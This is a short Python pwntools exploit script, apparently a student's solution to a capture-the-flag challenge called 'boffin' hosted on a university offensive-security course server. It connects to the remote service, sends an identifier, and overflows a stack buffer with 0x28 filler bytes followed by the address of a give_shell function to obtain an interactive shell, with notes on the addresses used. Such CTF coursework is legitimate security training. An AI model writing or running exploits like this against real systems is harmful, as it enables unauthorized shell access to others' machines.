from pwn import *

context.log_level = "DEBUG"

# LOCAL TESTING
#p = process("./boffin.htm")
#print(p.pid)

# REMOTE CONNECTION
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1337)
p.recvuntil(b"something like abc123): ")
p.send(b"aal562\n")

p.recvuntil(b"What's your name?")

# PAYLOAD
p.send(b"A" * 0x28 + b"\x9d\x06\x40\x00\x00" + b"\n")

# INTERACTIVE TO EXECUTE COMMANDS WITH SHELL
p.interactive()

# NOTES
#Starting addr for our buffer: 0x7fffffffde20
#Address overwritten with A's: 0x4141414141
#Address of give_shell function: 0x000040069d
